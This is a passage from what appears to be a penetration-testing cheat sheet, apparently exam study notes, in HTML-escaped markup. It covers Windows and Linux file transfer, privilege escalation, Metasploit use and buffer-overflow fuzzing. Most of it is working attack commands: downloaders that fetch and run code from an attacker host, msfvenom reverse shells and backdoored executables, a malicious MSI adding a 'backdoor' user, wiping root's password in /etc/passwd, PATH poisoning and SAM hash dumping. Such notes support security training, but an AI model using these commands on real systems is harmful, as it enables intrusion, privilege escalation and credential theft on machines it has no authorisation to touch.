echo Err.Clear &amp;gt;&amp;gt; wget.vbs 
echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs 
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &amp;gt;&amp;gt; wget.vbs 
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &amp;gt;&amp;gt; wget.vbs 
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &amp;gt;&amp;gt; wget.vbs 
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &amp;gt;&amp;gt; wget.vbs 
echo http.Open &quot;GET&quot;, strURL, False &amp;gt;&amp;gt; wget.vbs 
echo http.Send &amp;gt;&amp;gt; wget.vbs 
echo varByteArray = http.ResponseBody &amp;gt;&amp;gt; wget.vbs 
echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs 
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &amp;gt;&amp;gt; wget.vbs 
echo Set ts = fs.CreateTextFile(StrFile, True) &amp;gt;&amp;gt; wget.vbs 
echo strData = &quot;&quot; &amp;gt;&amp;gt; wget.vbs 
echo strBuffer = &quot;&quot; &amp;gt;&amp;gt; wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) &amp;gt;&amp;gt; wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &amp;gt;&amp;gt; wget.vbs 
echo Next &amp;gt;&amp;gt; wget.vbs 
echo ts.Close &amp;gt;&amp;gt; wget.vbs 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then execute &lt;code class=&quot;highlighter-rouge&quot;&gt;cscript wget.vbs http://[your IP]/file&lt;/code&gt; on the target machine.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Powershell&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;For targets that have powershell installed, you can create a powershell script to download a file from a webserver. Setup a webserver on Kali Linux using &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable apache2&lt;/code&gt;, and move the file you want to send to /var/www/html. Run this on the target:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo $storageDir = $pwd &amp;gt; wget.ps1 
echo $webclient = New-Object System.Net.WebClient &amp;gt;&amp;gt;wget.ps1 
echo $url = &quot;http://10.11.0.5/file&quot; &amp;gt;&amp;gt;wget.ps1 
echo $file = &quot;new-exploit.exe&quot; &amp;gt;&amp;gt;wget.ps1 
echo $webclient.DownloadFile($url,$file) &amp;gt;&amp;gt;wget.ps1 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;msfvenom&quot;&gt;Msfvenom&lt;/h3&gt;
&lt;p&gt;Common payloads:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;windows/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;windows/shell/reverse_tcp (staged)&lt;/li&gt;
  &lt;li&gt;php/reverse_php&lt;/li&gt;
  &lt;li&gt;windows/meterpreter/reverse_https (popular for looking just like normal web traffic)&lt;/li&gt;
  &lt;li&gt;linux/x86/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;linux/x86/shell/reverse_tcp (staged)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Creating a windows reverse shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Avoiding bad characters: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot; &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Prevent the process from exiting: Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;EXITFUNC=thread&lt;/code&gt; option when using msfvenom.&lt;/p&gt;

&lt;p&gt;Injecting a payload into an existing PE executable: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f exe -e x86/shikata_ga_nai -i 9 -x binary_to_inject_into.exe -o shell_reverse_msf_encoded_embedded.exe&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;upgrading-shell&quot;&gt;Upgrading Shell&lt;/h3&gt;

&lt;p&gt;On a Kali Linux terminal, use &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a&lt;/code&gt; to see information about your window. On the victim, run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; (if the victim does not have Python installed, &lt;a href=&quot;https://netsec.ws/?p=337&quot;&gt;click here&lt;/a&gt; to get a list of other commands that you can run). After running the command to spawn a TTY shell, Ctrl-Z out of the reverse shell you’re currently in, and type in the following three commands:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stty raw -echo
fg
reset
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Note that your terminal may get messed up while doing this and print out random characters, but once you type in “reset”, it should go back to normal. Now all you have to do is type in the following three commands:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export SHELL=bash
export TERM=[terminal type]
stty rows [rows] columns [134]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;You should know how many rows and columns you have because when you typed in &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a&lt;/code&gt; earlier, it printed out this information. The terminal type can vary depending on what kind of terminal you have, but I used “xterm-256color” as my terminal type.&lt;/p&gt;

&lt;h3 id=&quot;linux-privesc&quot;&gt;Linux Privesc&lt;/h3&gt;

&lt;p&gt;Find the version of linux: &lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Add public key to list of authorized SSH keys: &lt;code class=&quot;highlighter-rouge&quot;&gt;echo $(wget http://[your IP]/.ssh/id_rsa.pub) &amp;gt;&amp;gt; ~/.ssh/authorized_keys &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;C Code for becoming root (required for some exploits): &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -e '#include &amp;lt;stdio.h&amp;gt;\n#include &amp;lt;sys/types.h&amp;gt;\n#include &amp;lt;unistd.h&amp;gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem(&quot;/bin/bash&quot;);\n}' &amp;gt; setuid.c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If /etc/password has incorrect permissions, execute this code to instantly become root: &lt;code class=&quot;highlighter-rouge&quot;&gt;echo 'root::0:0:root:/root:/bin/bash' &amp;gt; /etc/passwd; su&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Changing PATH: If you can change the PATH variable, run &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=.$PATH&lt;/code&gt; to add the current folder to the PATH variable. Create a poisoned executable by typing in &lt;code class=&quot;highlighter-rouge&quot;&gt;echo &quot;usermod -aG sudo [username]&quot; &amp;gt;&amp;gt; /tmp/yo&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x yo&lt;/code&gt;. Replace yo with the name of a binary that is executed by root by another command or process. If you’re still confused, have a look at &lt;a href=&quot;http://techblog.rosedu.org/exploiting-environment-variables.html&quot;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Add to sudoers: Run &lt;code class=&quot;highlighter-rouge&quot;&gt;usermod -aG sudo [username]&lt;/code&gt;. You could also try seeing if you have permission to edit the /etc/sudoers file using &lt;code class=&quot;highlighter-rouge&quot;&gt;visudo&lt;/code&gt;. Sometimes, if you’re lucky, you can instantly get root by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Print commands that we are allowed to run as sudo: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you see a command in this list that allows you execute code, then you can execute code as root. For example, if we are allowed to use the find command as sudo, you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo find /home -exec sh -i\;&lt;/code&gt;. Another example: if we are allowed to use the python command as sudo, you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo python -c &quot;import pty; pty.spawn('/bin/bash');&quot;&lt;/code&gt;. You can use &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; to get a list of things that you can do when you are able to execute something as root.&lt;/p&gt;

&lt;p&gt;Exploit cron jobs: You can find cron jobs using &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la /etc/cron.d&lt;/code&gt;. If you can write to any of the files controlling the cron job, you can write your own command at the end of a cron job and have it be executed as root. For example, if you see a cron job called “update”, you can search for the sh file that is running that cron job using &lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm 2 -type f 2&amp;gt;/dev/null | grep update&lt;/code&gt;, and then you can modify it.&lt;/p&gt;

&lt;p&gt;Print out binaries that have the SUID bit set: &lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -u=s type f 2&amp;gt;/dev/null&lt;/code&gt;. Sometimes &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; can help you escalate privileges if you see an SUID binary.&lt;/p&gt;

&lt;p&gt;Script to extract passwords from known locations: &lt;a href=&quot;https://github.com/0xmitsurugi/gimmecredz&quot;&gt;gimmecredz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Enumeration scripts:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py&quot;&gt;linuxprivchecker.py&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;linux-exploit-suggester&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Good checklists:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://guif.re/linuxeop&quot;&gt;Guif.re&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;g0tmi1k&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://payatu.com/guide-linux-privilege-escalation&quot;&gt;payatu&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;windows-privesc&quot;&gt;Windows Privesc&lt;/h3&gt;

&lt;p&gt;Get system info: &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List environment variables: &lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List your privileges: &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami /priv&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Overwriting an Executable with Insecure Permissions:
Create a program called useradd.c on either the target (preferable, but if they don’t have gcc, you can’t do this) or on Kali.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt; 

int main () { 
    int i; 
    i=system (&quot;net localgroup administrators low /add&quot;); 
    return 0; 
} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Replace low with the name of your current user. Compile useradd.c using &lt;code class=&quot;highlighter-rouge&quot;&gt;i686-w64-mingw32-gcc -o tooverwrite.exe useradd.c&lt;/code&gt;, and move the exexcutable to the same directory as the executable that you want to overwrite.&lt;/p&gt;

&lt;p&gt;List scheduled tasks: &lt;code class=&quot;highlighter-rouge&quot;&gt;schtasks /query /fo LIST /v&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List running services: &lt;code class=&quot;highlighter-rouge&quot;&gt;tasklist /SVC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List started services: &lt;code class=&quot;highlighter-rouge&quot;&gt;net start&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;See what software is installed:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dir /a &quot;C:\Program Files&quot; 
dir /a &quot;C:\Program Files (x86)&quot; 
reg query HKEY_LOCAL_MACHINE\SOFTWARE 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dumping windows password hashes: You can use fgdump.exe to dump passwords in a file ending with .pwdump. Fgdump will also attempt to kill local antiviruses before dumping the passwords.&lt;/p&gt;

&lt;p&gt;Adding users: &lt;code class=&quot;highlighter-rouge&quot;&gt;net user [username] [password] /ADD&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Changing group: &lt;code class=&quot;highlighter-rouge&quot;&gt;net localgroup [group name] [username] /ADD&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;AlwaysElevated: Check if these two registry values are set to 1 by using &lt;code class=&quot;highlighter-rouge&quot;&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/code&gt;. If they are, then use the following command to create a malicious MSI: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi&lt;/code&gt;. Send the MSI to the target, and run the MSI file using &lt;code class=&quot;highlighter-rouge&quot;&gt;msiexec /quiet /qn /i evil.msi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Looking at the registry: If you can’t use the reg command, use the regedit command instead.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;regedit /E file.reg &quot;REGISTRY/VALUE/TO/READ&quot;
type file.reg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Getting admin hashes: Look in the below locations for password hashes&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;%SYSTEMROOT%\repair\SAM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\RegBack\SAM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\SAM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\repair\system&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\SYSTEM&lt;/li&gt;
  &lt;li&gt;%SYSTEMROOT%\System32\config\RegBack\system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Download both the SAM file and the SYSTEM file onto Kali Linux, and then run &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket-secretdump -sam SAM -system SYSTEM local&lt;/code&gt; to get the hashes.&lt;/p&gt;

&lt;p&gt;Searching for exploits: Run &lt;a href=&quot;https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py&quot;&gt;this script&lt;/a&gt; on Kali.&lt;/p&gt;

&lt;p&gt;Checklists:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot;&gt;fuzzysecurity&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&quot;&gt;absolomb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jaws Windows Enumerate Script (Requires Powershell): The script is found &lt;a href=&quot;https://github.com/411Hall/Jaws&quot;&gt;here&lt;/a&gt;. You can easily download and run the script using the following commands (assuming that you have a webserver setup on Kali and you have put the jaws-enum.ps1 file under /var/www/html).&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell 
IEX(New-Object Net.WebClient).downloadString('http://[your IP]/jaws-enum.ps1') 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;

&lt;p&gt;Selecting a module:
&lt;code class=&quot;highlighter-rouge&quot;&gt;use [module]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Setting a payload:
&lt;code class=&quot;highlighter-rouge&quot;&gt;use [payload]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Common payloads:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;windows/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;windows/shell/reverse_tcp (staged)&lt;/li&gt;
  &lt;li&gt;php/reverse_php&lt;/li&gt;
  &lt;li&gt;windows/meterpreter/reverse_https (popular for looking just like normal web traffic)&lt;/li&gt;
  &lt;li&gt;linux/x86/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;linux/x86/shell/reverse_tcp (staged)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Handle incoming connections:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
set LHOST [local IP]
set LPORT [port]
exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Common meterpreter commands:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Upload files: &lt;code class=&quot;highlighter-rouge&quot;&gt;upload [local file] [remote location for file]&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Download files: &lt;code class=&quot;highlighter-rouge&quot;&gt;download [remote file] [local location for file]&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Open a shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Find basic information about the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Get the current user: &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Search for a file: &lt;code class=&quot;highlighter-rouge&quot;&gt;search –f *pass*.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Take a screenshot of the desktop: &lt;code class=&quot;highlighter-rouge&quot;&gt;screenshot&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Convert metasploit modules to stand alone (a little bit advanced): &lt;a href=&quot;https://netsec.ws/?p=262&quot;&gt;https://netsec.ws/?p=262&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;steps-for-buffer-overflow&quot;&gt;Steps for Buffer Overflow&lt;/h3&gt;
&lt;p&gt;1.) Gradually fuzz the input until you see that the program has crashed. Here is an example program that can be used for fuzzing:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python 
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt; 
&lt;span class=&quot;c1&quot;&gt;# Create an array of buffers, from 1 to 5900, with increments of 200. 
&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Fuzzing PASS with &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s bytes&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'IP address'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Change IP and port!
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'USER test&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'PASS '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'QUIT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;2.) We need to figure out where the program crashed. Use &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size]&lt;/code&gt;, where size is a possible size that crashed the program in the previous step. This program will create a string that you should use as input into the program. After sending the string to the program, view it in a debugger, and copy the value of EIP right when the program crashed. You can then use &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [size] -q [EIP's value]&quot;&lt;/code&gt; to discover the precise location where you can rewrite EIP.&lt;/p&gt;

&lt;p&gt;3.) We need to check for bad characters, which are characters that should not be in your shellcode because they could delete part of your string (such as the \x00 character, which terminates strings in C). Below, there is a list of characters.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; 
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; 
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; 
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; 
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; 
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; 
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; 
